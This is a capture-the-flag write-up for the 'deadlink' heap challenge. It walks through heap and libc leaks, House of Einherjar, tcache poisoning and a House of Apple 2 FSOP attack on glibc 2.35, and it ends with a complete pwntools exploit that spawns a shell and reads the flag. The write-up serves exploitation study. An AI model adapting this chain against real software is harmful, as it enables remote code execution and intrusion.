# Dead Link — BCS CTF Pwn (Hard)

**Binary:** `deadlink`  
**Target:** `nc 172.16.38.22 6656`  
**Protections:** Full RELRO, Stack Canary, NX, PIE, CET (SHSTK + IBT)  
**Glibc:** 2.35 (Ubuntu 22.04)  
**Flag:** `bcsctf{nU11_byt3_31nh3rj4r_1n_th3_d34d_l1nk_n0de}`

---

## Binary Overview

`deadlink` is a singly-linked heap note manager. Nodes are stored in FIFO order. Each node is:

```
struct node {
    void   *next;     // +0x00
    size_t  size;     // +0x08
    char    data[];   // +0x10
};
```

The binary calls `malloc(user_size + 0x10)`, so chunk headers live at `node - 0x10`.

**Menu operations:**
- **Add** — allocate a new node, append to list tail
- **Delete** — remove node at index `i` from live list, `free()` it, store dangling pointer in `bin[]`
- **Change** — write new data to node at index `i` (via `read_with_null`)
- **Print** — dump all live nodes
- **Recycle bin** — print dangling `bin[]` pointers (UAF read)
- **Exit** — calls `exit()` (not `_exit()`), triggering `_IO_cleanup`

### `read_with_null(buf, n)`

Calls `read(0, buf, n)` exactly once and writes a NUL byte at `buf[n]`. This is the **off-by-one** primitive: if you send exactly `n` bytes, NUL lands at `buf[n]` — one byte past the buffer.

### Gate Challenge

On connect the binary prints a `system()` PIE address and a token, and requires a solution:

```
solution[i] = token[i] ^ ((i*7) & 0xff) ^ 0xc3
```

This leaks **PIE base** and gates further interaction.

### Output

The binary uses `write()` directly for all output, bypassing `FILE` structs. FSOP only fires when `exit()` is called from the menu, triggering `_IO_cleanup → _IO_flush_all_lockp`.

---

## Exploit Strategy

```
1. Heap leak    — tcache safe-linked fd >> 12
2. Libc leak    — unsorted bin fd (main_arena + 0x60)
3. Einherjar    — off-by-one NUL clears Q.PREV_INUSE;
                  backward-consolidate to 0xe00 chunk overlapping P
4. Tcache poison— overlapping C edits P's freed tcache fd → stdout-0x10
5. FSOP         — allocate onto stdout; corrupt _IO_2_1_stdout_ with
                  House of Apple 2 payload; trigger via exit()
```

---

## Step 1 — Heap Leak

Allocate a node of size `0x88` (chunk_size `0xa0`, tcache bin 8). Free it. The UAF `binview` prints the `next` field of the freed node, which is the tcache safe-linked fd:

```
stored_fd = NULL ^ (chunk_user_ptr >> 12) = chunk_user_ptr >> 12
heap_base = stored_fd << 12
```

## Step 2 — Libc Leak

Allocate a node of size `0x4e8` (chunk_size `0x500` > tcache max `0x410`). Add a guard node (`0x18`) to prevent top-chunk merge. Free the large node — it falls into the unsorted bin, whose `fd` points to `main_arena + 0x60`:

```python
libc_base = fd - (main_arena_offset + 0x60)
```

---

## Step 3 — House of Einherjar

### Heap layout after setup

```
heap + 0x860  [R]    chunk_size=0x510  ← contains fake chunk F at R+0x20
heap + 0xd70  [P]    chunk_size=0x410  ← off-by-one NUL target
heap + 0x1180 [Q]    chunk_size=0x500  ← to be freed
heap + 0x1680 [g2]   chunk_size=0x300  ← guard, prevents top merge
```

**Fake chunk F** is planted inside R's data area at `F = heap+0x880`:
```python
# change(R):
p64(0)           # F.prev_size = 0
p64(prevsz)      # F.size = Q - F = 0x900  (PREV_INUSE cleared)
p64(F)           # F.fd = F  (self-referential — survives safe-unlink)
p64(F)           # F.bk = F
```

**Off-by-one NUL** via `change(P, b'A'*0x3f0 + p64(prevsz), newline=False)`:
- Sends exactly `0x3f8` bytes (P.size).
- `read_with_null` writes NUL at `P_data[0x3f8]` = `Q_chunk + 0x8` = Q's **size field byte 0**.
- Q.size was `0x501` (PREV_INUSE set); NUL clears bit 0 → `0x500`. **PREV_INUSE = 0**.
- `p64(prevsz)` at the end of P's data sets `Q.prev_size = 0x900`.

**free(Q)** triggers backward consolidation:
- `Q - Q.prev_size = heap+0x1180 - 0x900 = heap+0x880 = F` ✓
- `chunksize(F) == Q.prev_size` (0x900 == 0x900) ✓
- Safe-unlink passes (F.fd->bk == F and F.bk->fd == F) ✓
- Merged chunk: **0xe00** at `F = heap+0x880`, placed in unsorted bin.

---

## Step 4 — Overlapping Chunk C

Allocate **C** from the `0xe00` unsorted chunk: `add(0x500)` → chunk_size `0x520`.

C's data area (`heap+0x8a0`) **overlaps** P's chunk header and node struct:
```
C_data + 0x4d8  =  heap+0xd78  =  P_chunk.size field
C_data + 0x4e0  =  heap+0xd80  =  P_node.fd  (tcache fd when freed)
C_data + 0x4e8  =  heap+0xd88  =  P_node.key (tcache key when freed)
```

### Tcache count fix

Tcache bin 63 (chunk_size `0x410`) is checked with `counts[63] > 0`. After consuming one entry, the count must still be ≥ 1 for the poisoned entry to be served. Add a **dummy E** chunk first:

```python
d.add(0x3f8, b'E')   # allocates from 0xe00 remainder at heap+0xda0
d.delete(6)           # E → tcache[63], counts[63] = 1
```

### Phase 1 — restore P's live-list fields

```python
init_payload[0x4d8] = p64(0x411)     # P_chunk.size
init_payload[0x4e0] = p64(g2_node)   # P_node.next (live list link)
init_payload[0x4e8] = p64(0x3f8)     # P_node.size
d.change(5, init_payload)             # C is index 5
```

### Phase 2 — free P, then poison tcache fd

```python
d.delete(3)           # free P → tcache[63], counts[63] = 2

safe_val = (stdout - 0x10) ^ (P_node >> 12)   # safe-linked encoding
second_payload[0x4d8] = p64(0x411)
second_payload[0x4e0] = p64(safe_val)          # P_node.fd → stdout-0x10
d.change(4, second_payload)                     # C is index 4 after P removed
```

> **Note on TCP fragmentation.** `read_with_null` calls `read()` once. Over a TCP socket, a payload > MTU (~1460 bytes) arrives in multiple segments; the first `read()` returns early, leaving leftover bytes in the socket buffer that corrupt subsequent commands. Using C size `0x500` (1280 bytes) keeps every `change()` call within one TCP segment.

### Consume P, expose stdout target

```python
d.add(0x3f8, b'D')   # D ← P_node from tcache; counts[63]: 2→1
                      # tcache[63] now = stdout-0x10, counts[63] = 1
```

---

## Step 5 — FSOP (House of Apple 2)

With `counts[63] = 1` and `tcache[63].entry = stdout-0x10`, the next `malloc(0x408)` returns `stdout-0x10`. The binary writes the node struct there, placing our data at `stdout`.

### Fake wide data (in X's data area, `Ha = heap+0x350`)

```
W   = Ha          (fake _IO_wide_data)
Vw  = Ha + 0x100  (fake _wide_vtable)

W[0xe0] = p64(Vw)       # _wide_data->_wide_vtable = Vw
Vw[0x68] = p64(system)  # _wide_vtable->__doallocate = system
```

### FSOP payload (written to stdout)

```
_flags         =  b'  /bin/sh\x00'   # argument to system()
_IO_write_ptr  =  1                  # != _IO_write_base → triggers overflow path
_lock          =  Ha + 0x8           # points to zeroed heap memory
_wide_data     =  W
vtable         =  _IO_wfile_jumps    # triggers _IO_wfile_overflow
```

**Call chain on `exit()`:**
```
_IO_flush_all_lockp
  → _IO_wfile_overflow(fp)
    → _IO_wdoallocbuf(fp)
      → _IO_WDOALLOCATE(fp)
        = fp->_wide_data->_wide_vtable->__doallocate(fp)
        = system(fp)          ← fp->_flags = "  /bin/sh"
```

---

## Full Exploit

```python
from pwn import *
import sys, re
sys.path.insert(0, '/work'); from dl import DL
context.log_level = 'error'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
OFF_MAIN_ARENA = 0x21ac80

io = remote('172.16.38.22', 6656)
d = DL(io); d.solve_gate()

# --- Heap leak ---
d.add(0x88, b'A'); d.delete(0)
bv = d.binview()
heap = int(re.search(rb'next=(0x[0-9a-f]+)', bv).group(1), 16) << 12

# --- Libc leak ---
d.add(0x4e8, b'B'); d.add(0x18, b'g'); d.delete(0)
bv = d.binview()
libc_leak = max(int(m.group(1), 16) for m in re.finditer(rb'next=(0x[0-9a-f]+)', bv))
libc_base = libc_leak - (OFF_MAIN_ARENA + 0x60)
system  = libc_base + libc.symbols['system']
stdout  = libc_base + libc.symbols['_IO_2_1_stdout_']
wfile   = libc_base + libc.symbols['_IO_wfile_jumps']

# --- Layout ---
R = heap + 0x860; P = R + 0x510; Q = P + 0x410; F = R + 0x20
prevsz = Q - F          # 0x900
P_node = P + 0x10
Ha = heap + 0x350; W = Ha; Vw = Ha + 0x100
g2_node  = Q + 0x510
safe_val = (stdout - 0x10) ^ (P_node >> 12)

# --- Einherjar setup ---
d.add(0x1f8, b'X'); d.add(0x4f8, b'R')
d.add(0x3f8, b'P'); d.add(0x4e8, b'Q'); d.add(0x2e8, b'g2')

d.change(2, p64(0)+p64(prevsz)+p64(F)+p64(F)+p64(0)+p64(0), newline=True)
d.change(3, b'A'*0x3f0 + p64(prevsz), newline=False)
d.delete(4)   # free Q → 0xe00 merged chunk at F

# --- FSOP gadgets in X's data ---
aux = bytearray(0x1f8)
aux[0xe0:0xe8]   = p64(Vw)
aux[0x168:0x170] = p64(system)
d.change(1, bytes(aux), newline=True)

# --- Overlapping chunk C (0x500 < MTU to avoid TCP fragmentation) ---
d.add(0x500, b'C')
d.add(0x3f8, b'E'); d.delete(6)          # E → tcache[63], count=1

init_payload = bytearray(0x500)
init_payload[0x4d8:0x4e0] = p64(0x411)   # restore P_chunk.size
init_payload[0x4e0:0x4e8] = p64(g2_node) # restore P_node.next
init_payload[0x4e8:0x4f0] = p64(0x3f8)   # restore P_node.size
d.change(5, bytes(init_payload), newline=False)
d.delete(3)                               # free P → tcache[63], count=2

second_payload = bytearray(0x500)
second_payload[0x4d8:0x4e0] = p64(0x411)
second_payload[0x4e0:0x4e8] = p64(safe_val)  # P.fd → stdout-0x10
d.change(4, bytes(second_payload), newline=False)

d.add(0x3f8, b'D')   # consume P; tcache[63]=stdout-0x10, count=1

# --- Write FSOP payload to stdout ---
FSOP = bytearray(0xe0)
FSOP[0x00:0x09] = b'  /bin/sh\x00'
FSOP[0x28:0x30] = p64(1)
FSOP[0x88:0x90] = p64(Ha + 0x8)
FSOP[0xa0:0xa8] = p64(W)
FSOP[0xd8:0xe0] = p64(wfile)

d._cmd('add')
io.recvuntil(b'Size?');  io.sendline(b'1016')
io.recvuntil(b'Data?')
io.send(bytes(FSOP) + b'\x00'*(0x3f7 - len(FSOP)) + b'\n')
io.recvuntil(b'$ ', timeout=5)

# --- Trigger FSOP via exit() ---
io.send(str(d.m['exit']).encode() + b'\n')
io.send(b'cat /script/flag.txt; echo DONE\n')
print(io.recvrepeat(5.0).decode(errors='replace'))
io.close()
```

---

## Key Gotchas

| Issue | Root cause | Fix |
|---|---|---|
| `free(P)` goes to consolidation, not tcache | P chunk_size was `0x510` (> tcache max `0x410`) | Use `add(0x3f8)` → chunk_size `0x410` = bin 63 |
| `free(P)` crash: `size == 0` | Writing zeroed `init_payload` over P_chunk.size | Set `init_payload[0x4d8] = p64(0x411)` to restore it |
| Live list traversal crash after poisoning P | Writing `safe_val` to P_node.next while P is still live | Two-phase: restore P fields → free P → then write `safe_val` |
| `malloc` skips poisoned tcache entry | `counts[63] == 0` after D consumes P | Pre-free dummy E before P; count reaches 2, stays ≥ 1 after D |
| Remote crash mid-exploit | TCP fragments 2544-byte payload; `read()` returns early; leftover bytes corrupt next command | Reduce C size to `0x500` (1280 bytes < MTU ~1460) |
